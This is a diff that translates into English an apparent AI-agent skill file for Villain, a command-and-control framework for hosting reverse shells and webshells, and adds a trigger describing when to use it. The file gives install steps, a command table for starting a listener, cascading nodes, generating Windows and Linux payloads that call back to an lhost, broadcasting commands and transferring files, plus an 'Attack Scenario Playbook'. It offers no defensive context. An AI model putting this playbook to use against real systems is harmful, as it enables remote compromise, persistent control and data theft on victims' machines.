@@ -2,41 +2,43 @@
 name: villain-c2-shells
 description: "Villain: Multi-session shell hosting. Signals: webshell, RCE, start master, cascade nodes, generate payload."
 zh-signals: "Villain: 多会话 shell 托管。信号:webshell,rce,起主控,级联节点,生成 payload。"
+when-to-use: >-
+  Use when you need to host and manage multiple reverse shells or webshell sessions from a central controller, including cascading nodes and payload generation.
 ---
 
 # Villain
 
-- 攻击大类:C13 远程命令执行与WebShell
-- 上游仓库:https://github.com/t3l3machus/Villain
-- 上游 License:BSD-2-Clause(需人工确认)(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C13 Remote Command Execution and WebShell
+- Upstream Repository: https://github.com/t3l3machus/Villain
+- Upstream License: BSD-2-Clause (manual review required) (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/t3l3machus/Villain && cd Villain && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./Villain.py -p 4443` | 起主控 |
-| `-x 10.8.0.2:4443` | 级联节点 |
-| `generate os=windows lhost=10.8.0.2` | 生成 payload |
-| `shell` | 交互 shell |
-| `upload/download` | 文件传输 |
-| `exec` | 广播执行 |
+| `./Villain.py -p 4443` | Start master controller |
+| `-x 10.8.0.2:4443` | Cascading node |
+| `generate os=windows lhost=10.8.0.2` | Generate payload |
+| `shell` | Interactive shell |
+| `upload/download` | File transfer |
+| `exec` | Broadcast execution |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 多会话 shell 托管
+### Multi-Session Shell Hosting
 
 ```bash
 ./Villain.py -p 4443
 Villain > generate os=linux lhost=10.8.0.2
-# 会话自动回连主控,支持多节点级联与兄弟会话共享
+# Sessions automatically call back to the master controller, supporting multi-node cascading and sibling session sharing
 ```
 
-## 注意事项
+## Notes
 
-hoaxshell 同作者的会话管理升级版;多目标反弹集中管理,加密通信。
+A session-management upgrade by the same author as hoaxshell; centralized management of reverse shells across multiple targets, with encrypted communications.
